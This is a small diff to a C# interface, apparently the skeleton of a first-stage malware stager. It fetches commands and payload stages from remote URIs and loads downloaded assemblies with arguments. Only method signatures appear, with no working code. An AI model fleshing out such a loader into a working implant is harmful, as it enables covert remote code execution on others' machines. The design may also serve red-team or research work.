@@ -10,10 +10,10 @@ namespace Stager
     interface IStageZero
     {
         Task<StagerCommand> RequestCommand(Uri site);
-        void RequestStage(Uri site);
+        Task<byte[]> RequestStage(Uri site);
         int LoadUriList(FileInfo uriFile);
         void AddUrisToList(List<Uri> addUris);
         void RemoveUrisFromList(List<Uri> removeUris);
-        int LoadStage(byte[] assembly);
+        int LoadStage(byte[] assembly, Dictionary<string, string> arguments);
     }
 }
